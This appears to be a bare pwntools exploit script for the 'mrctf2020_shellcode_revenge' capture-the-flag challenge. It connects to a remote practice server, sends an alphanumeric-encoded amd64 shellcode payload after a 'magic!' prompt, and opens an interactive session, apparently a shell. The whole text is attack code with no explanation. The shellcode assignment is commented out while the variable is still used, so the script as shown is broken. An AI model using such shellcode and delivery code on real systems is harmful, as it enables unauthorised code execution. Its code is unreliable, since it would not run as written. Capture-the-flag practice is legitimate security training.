from pwn import *

#p = process("./mrctf2020_shellcode_revenge")
p = remote("node3.buuoj.cn",29367)
context.update(arch = 'amd64', os = 'linux', timeout = 1)

#shellcode="Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"


p.sendafter("magic!\n",shellcode)

p.interactive()